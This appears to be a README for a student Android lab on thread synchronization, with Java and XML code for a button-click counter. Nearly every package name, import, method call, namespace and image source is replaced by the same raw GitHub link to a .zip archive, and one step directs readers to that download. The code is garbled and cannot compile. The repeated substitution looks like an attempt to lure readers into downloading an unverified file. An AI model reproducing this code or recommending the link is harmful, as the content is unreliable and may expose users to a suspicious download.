# EX_13_THREAD
## AIM:
To develop a thread synchronization concept with the help of clicking the button in Android Studio.

## EQUIPMENTS REQUIRED:
Latest Version Android Studio

## ALGORITHM:
Step 1: Open Android Studio and then click on File -> New -> New project.

Step 2: Then type the Application name as HelloWorld and click Next.

Step 3: Then select the Minimum SDK as shown below and click Next.

Step 4: Then select the Empty Activity and click Next. Finally click Finish.

Step 5: Design layout in https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip

Step 6: Display message give in MainActivity file.

Step 7: Save and run the application.

## PROGRAM:
/*
Program to print the text “optionmenu”.
Developed by: SHAIK MUFEEZUR RAHAMAN
Registeration Number :
*/

## https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip
```
package https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip;

import https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip;

import https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip;
import https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip;
import https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip;
import https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip;
import https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip;
import https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip;
import https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip;
import https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip;
public class MainActivity extends AppCompatActivity {
    private static final String TAG = "MainActivity";

    // Object used for synchronizing access to counter
    private static final Object lock = new Object();

    // Maximum number of concurrent threads
    // that can access the counter
    private static final int MAX_THREADS = 5;

    // Semaphore to limit concurrent access to the counter
    private static final Semaphore semaphore = new Semaphore(MAX_THREADS);

    // Counter to store the
    // number of button clicks
    private int counter = 0;

    // Reference to the text view to
    // display the number of button clicks
    private TextView textView;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip(savedInstanceState);
        setContentView(https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip);
        textView = findViewById(https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip);
    }
    public void incrementCounter(View view) {
        // Start a new thread to increment the counter
        new Thread(() -> {
            try {
                // Acquire the semaphore
                https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip();
                // Synchronized block to update the counter
                synchronized (lock) {
                    counter++;
                }
            } catch (InterruptedException e) {
                // Log an error if the thread is interrupted
                Log.e(TAG, "Thread interrupted", e);
            } finally {
                // Release the semaphore
                https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip();
            }
            // Update the text view on the main thread
            updateTextView();
        }).start();
    }

    // Method to update the text view on the main thread
    private void updateTextView() {
        // Post the update to the main thread's message queue
        new Handler(getMainLooper()).post(() -> https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip(https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip(counter)));
    }

}
```
## https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip
```
<?xml version="1.0" encoding="utf-8"?>
<https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip
    xmlns:android="https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip"
    xmlns:app="https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip"
    xmlns:tools="https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    tools:context=".MainActivity">

    <!-- A text view to display the count -->
    <TextView
        android:id="@+id/text_view"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="0"
        android:textSize="32sp"
        app:layout_constraintBottom_toTopOf="@+id/increment_button"
        app:layout_constraintLeft_toLeftOf="parent"
        app:layout_constraintRight_toRightOf="parent"
        app:layout_constraintTop_toTopOf="parent" />

    <!-- A button to increment the count -->
    <Button
        android:id="@+id/increment_button"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:onClick="incrementCounter"
        android:text="Increment"
        app:layout_constraintBottom_toBottomOf="parent"
        app:layout_constraintLeft_toLeftOf="parent"
        app:layout_constraintRight_toRightOf="parent"
        app:layout_constraintTop_toTopOf="parent" />

<https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip>
```

## OUTPUT

<img src="https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip" width="50%" height="100%">

## RESULT

The application is successfully displayed for thread synchronization concept with the help of clicking the button in Android Studio.
